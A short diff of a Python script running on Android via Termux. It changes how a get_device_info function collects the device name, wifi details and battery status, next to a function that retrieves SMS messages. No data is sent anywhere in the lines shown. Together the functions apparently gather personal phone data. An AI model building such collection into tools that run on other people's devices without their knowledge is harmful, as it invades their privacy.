@@ -121,12 +121,12 @@ def get_sms_messages():
     except Exception as e:
         return f"Error retrieving SMS messages: {str(e)}"
 
-# Function to get device information
+# Function to get device information (using Termux API)
 def get_device_info():
     try:
         device_info = {
             "Device Name": subprocess.run(['termux-info'], capture_output=True, text=True).stdout,
-            "IP Address": subprocess.run(['ip', 'addr', 'show', 'wlan0'], capture_output=True, text=True).stdout,
+            "IP Address": subprocess.run(['termux-wifi-connectioninfo'], capture_output=True, text=True).stdout,
             "Battery Level": subprocess.run(['termux-battery-status'], capture_output=True, text=True).stdout
         }
         device_info_str = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
